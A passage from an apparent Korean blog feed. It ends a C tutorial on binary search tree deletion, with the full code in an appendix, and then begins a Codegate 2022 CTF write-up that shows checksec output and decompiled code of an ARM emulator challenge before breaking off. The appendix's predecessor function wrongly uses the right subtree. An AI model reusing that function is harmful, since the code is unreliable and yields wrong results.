xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>를 삭제할 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq> 위치에 대입한 후, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>의 오른쪽 자식 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>과 연결해줍니다. 앞서 말했듯 다음 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>는 왼쪽 자식이 없어, 두 작업 모두 전혀 문제가 되지 않습니다.</p>
<p><img src="/images/binary-search-tree/9.png" alt="9.png"></p>
<p>삭제 연산은 모든 경우에서 노드를 다른 노드의 위치에 대입하는 작업이 필요합니다. 따라서 먼저 대입을 위한 내장 함수 <code>__transplant</code> 를 구현하겠습니다. 이 함수는 노드 <code>v</code> 를 노드 <code>u</code> 위치에 대입한 후, 기존 노드 <code>u</code> 의 부모가 새로운 노드 <code>v</code> 를 자식으로 갖도록 합니다. 다만 새로운 노드 <code>v</code> 의 자식 포인터들을 연결하는 작업은 하지 않아, 함수를 호출한 쪽에서 직접 해야 합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line">	<span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;			<span class="comment">// u가 루트 노드인 경우</span></span><br><span class="line">		bst-&gt;root = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;	<span class="comment">// u가 왼쪽 자식이었다면</span></span><br><span class="line">		u-&gt;parent-&gt;left = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;							<span class="comment">// u가 오른쪽 자식이었다면</span></span><br><span class="line">		u-&gt;parent-&gt;right = v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		v-&gt;parent = u-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이제 <code>__transplant</code> 함수를 이용해서 삭제 함수를 편하게 구현할 수 있습니다. 삭제 연산을 위한 <code>delete</code> 함수는 키 <code>key</code> 를 받아, 내장 함수 <code>__tree_search</code> 를 호출하여 삭제할 노드 <code>x</code> 를 찾고 삭제합니다. 4행과 6행은 삭제할 노드 <code>x</code> 의 자식이 없거나 하나인 경우로, <code>__transplant</code> 함수를 호출해 자식 또는 <code>NULL</code> 을 <code>x</code> 위치에 대입합니다.</p>
<p>9행은 <code>x</code> 의 자식이 둘인 경우입니다. 이 경우는 먼저 <code>x</code> 의 오른쪽 트리에서 다음 노드 <code>y</code> 를 찾습니다. 11행은 <code>y</code> 가 <code>x</code> 의 오른쪽 자식이 아닌 경우로, 위의 그림과 같이 <code>y</code> 의 오른쪽 자식을 <code>y</code> 위치에 대입시켜 놓습니다. 이후 <code>y</code> 가 <code>x</code> 의 오른쪽 자식 (그림에서 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>)의 부모가 되도록 연결합니다. 그러면 16행에서, 다음 노드가 <code>x</code> 의 오른쪽 자식인 경우와 똑같이 <code>y</code> 를 <code>x</code> 위치에 대입만 해주면 됩니다. 대입 후 <code>y</code> 의 자식에 대한 포인터 연결은 직접 해야 함에 유의합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;right);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;left);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y = __tree_min(x-&gt;right);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">			__transplant(bst, y, y-&gt;right);</span><br><span class="line">			y-&gt;right = x-&gt;right;</span><br><span class="line">			y-&gt;right-&gt;parent = y;</span><br><span class="line">		&#125;</span><br><span class="line">		__transplant(bst, x, y);</span><br><span class="line">		y-&gt;left = x-&gt;left;</span><br><span class="line">		y-&gt;left-&gt;parent = y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0" tabindex="-1">이진 탐색 트리 사용해보기</h2>
<p>이진 탐색 트리의 모든 연산을 구현했으니, 직접 사용해 봅시다. 아래는 <code>BST</code> 구조체를 사용하는 테스트 코드입니다. 5행은 이진 탐색 트리에 1부터 10까지의 키를 뒤죽박죽 삽입하고 출력합니다. 삽입은 그렇게 해도 출력은 작은 순서대로 잘 나와줍니다. 10행은 키 1~3을 삭제하고, 11~13을 새로 집어넣은 후 또 출력합니다. 이번에도 4부터 13까지 작은 순서대로 잘 출력됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">	BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./main </span><br><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">3 3</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">11 11</span><br><span class="line">12 12</span><br><span class="line">13 13</span><br></pre></td></tr></table></figure>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>이진 탐색 트리는 키-값 데이터를 정렬된 순서로 관리할 수 있고, 삽입과 삭제 등의 모든 연산을 이상적으로는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간에 처리할 수 있습니다. 하지만 트리의 형태에 따라 최악의 경우 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간까지 걸릴 수 있습니다. 이 경우에는 선형 자료구조에 비해 별로 좋은 점이 없습니다.</p>
<p>따라서 집합이나 딕셔너리 등 컨테이너의 구현에는 트리의 형태를 효율적인 형태로 유지하도록 하는 알고리즘이 추가된 자가 균형(self-balancing) 이진 탐색 트리를 사용합니다. 실제로 리눅스의 <code>g++</code> 컴파일러가 사용하는 C++ 라이브러리를 동적 분석한 결과, <code>std::set</code> 의 구현에 자가 균형 이진 탐색 트리의 일종인 레드-블랙 트리(red-black tree)를 사용하고 있었다고 합니다.</p>
<p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" target="_blank"><div class="link-preview-widget-title">What is the underlying data structure of a STL set in C++?</div><div class="link-preview-widget-description">I would like to know how a set is implemented in C++. If I were to implement my own set container without using the STL provided container, what would be the best way to go about this task?

I unde...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] T.H. Corman, C.E. Leiserson, R.L. Rivest and C. Stein, “Binary Search Trees,” in <em>Introduction to Algorithms</em>, 3rd ed. Cambridge, MA: MIT Press, 2009, pp. 286-298.</p>
<h2 id="%EB%B6%80%EB%A1%9D" tabindex="-1">부록</h2>
<h3 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84-%EC%BD%94%EB%93%9C" tabindex="-1">이진 탐색 트리 구현 코드</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Definitions */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> key, value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">	Node *root;</span><br><span class="line">&#125; BST;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Internal Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line">	<span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__tree_walk(x-&gt;left);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">		__tree_walk(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;left;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_max(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line">	<span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;			</span><br><span class="line">		bst-&gt;root = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;	</span><br><span class="line">		u-&gt;parent-&gt;left = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;							</span><br><span class="line">		u-&gt;parent-&gt;right = v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		v-&gt;parent = u-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Exposed Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">	__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">	Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">	Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		y = x;</span><br><span class="line">		x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;	<span class="comment">// bst is empty</span></span><br><span class="line">		bst-&gt;root = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">		y-&gt;left = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y-&gt;right = newnode;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;right);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;left);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y = __tree_min(x-&gt;right);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">			__transplant(bst, y, y-&gt;right);</span><br><span class="line">			y-&gt;right = x-&gt;right;</span><br><span class="line">			y-&gt;right-&gt;parent = y;</span><br><span class="line">		&#125;</span><br><span class="line">		__transplant(bst, x, y);</span><br><span class="line">		y-&gt;left = x-&gt;left;</span><br><span class="line">		y-&gt;left-&gt;parent = y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Driver Code */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">	BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Computer Science</category>
        <category>Data Structures</category>
      </categories>
  </entry>
  <entry>
    <title>[Codegate CTF 2022] ARVM</title>
    <url>/2022/07/03/codegate22-arvm/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>Welcome! Here is my Emulator. It can use only human.<br>
Always SMiLEY 😃</p>
</blockquote>
<p><a href="/uploads/codegate22-arvm/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>32비트 ARM 바이너리 <code>app</code> 과 <code>Dockerfile</code> , <code>run.sh</code> 등이 주어집니다. <code>run.sh</code> 파일에서 바이너리는 <code>qemu-arm-static</code> 으로 에뮬레이션하여 실행됨을 확인할 수 있습니다. 바이너리는 심볼이 strip되어 있고, NX, canary 보호 기법이 적용되어 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 코드를 입력받고, 3가지의 메뉴가 주어집니다. 코드를 입력하고 '1. Run Code’를 선택하면 바이너리가 출력하는 Secret code를 똑같이 입력해야 하는데, 앞서 코드로 “111” 을 입력했더니 “Instruction 0xa31313131 is invalid” 메시지와 함께 종료됩니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app</span><br><span class="line">Running Emulator...</span><br><span class="line">Welcome Emulator</span><br><span class="line">Insert Your Code :&gt; 111</span><br><span class="line">1. Run Code</span><br><span class="line">2. View Code</span><br><span class="line">3. Edit Code</span><br><span class="line">:&gt; 1</span><br><span class="line">Before run, it has some captcha</span><br><span class="line">Secret code : 0x52bae0cd</span><br><span class="line">Code? :&gt; 0x52bae0cd</span><br><span class="line">Instruction 0xa313131 is invalid</span><br></pre></td></tr></table></figure>
<p><code>main</code> 함수를 살펴보면 다음과 같습니다. 13행에서 <code>setup</code> 함수를 호출하여 필요한 구조체와 메모리를 할당하고, 17행에서 <code>edit_code</code> 함수를 호출하여 코드를 입력받습니다. 53행에서 호출하는 <code>check_code</code> 함수의 리턴값이 -1이 아니면 56~61행에서 입력한 코드를 실행하는데, <code>R0</code> 부터 <code>R12</code> 까지 모두 0으로 초기화하는 코드를 앞에 덧붙인 후 실행합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> captcha; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [sp+8h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [sp+Ch] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+1Ch] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;_stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( setup() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">16u</span>);</span><br><span class="line">    choice = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )                          <span class="comment">// 1. Run Code</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )                          <span class="comment">// 2. View Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )                     <span class="comment">// 3. Edit Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  captcha = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  read(fd, &amp;captcha, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before run, it has some captcha&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Secret code : 0x%x\n&quot;</span>, captcha);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Code? :&gt; &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;0x%x&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( captcha != input )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are Robot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( check_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good! Now Execute Real Machine&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(em-&gt;code, <span class="number">0</span>, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(em-&gt;code, &amp;clear_regs_code, <span class="number">52u</span>);      <span class="comment">// mov 